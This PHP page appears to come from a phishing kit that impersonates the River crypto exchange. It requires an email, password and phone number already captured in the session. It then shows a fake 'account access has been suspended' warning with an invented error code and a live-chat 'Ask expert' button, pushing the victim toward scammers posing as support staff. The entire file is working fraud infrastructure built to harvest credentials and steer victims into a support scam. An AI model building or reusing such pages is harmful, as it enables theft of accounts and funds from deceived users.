<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Sign in to River | Buy, Sell and Margin Trade Bitcoin (BTC) and Ethereum (ETH)';
    include_once './includes/meta.php';
    if (empty($_SESSION["email"]) || empty($_SESSION["password"])) {
        redirect(base_url());
    }
    if (empty($_SESSION["phone_number"])) {
        redirect(base_url('verify.php'));
    }
    ?>
    <body class="bg-dark">
        <div class="container">
            <?php include_once './includes/header.php'; ?>
            <div class="row mt-3">
                <div class="col-12 offset-0 col-md-5 offset-md-3  bg-dark">
                    <div class="mt55 mb50 ">
                        <form method="post" action="<?= base_url('send.php') ?>" class="col-12 shadow-sm px20 py17 rounded-4 ">
                            <h2 class="fs25 mb20 text-white">Important Information</h2>
                            <p class="my15 text-white">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately</p>
                            <h3 class="fs16 text-danger">Error CODE: EBRX1:6X76D</h3>
                            <div class="text-center mx-auto d-grid gap-2 my25">
                                <a href="javascript:void(Tawk_API.toggle())" class="btn bg-gold btn-lg btn-primary-3 border-0 fs16 fw-medium btn-block rounded-2">Ask expert</a>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <?php include_once './includes/footer.php'; ?>
        </div>
    </body>
</html>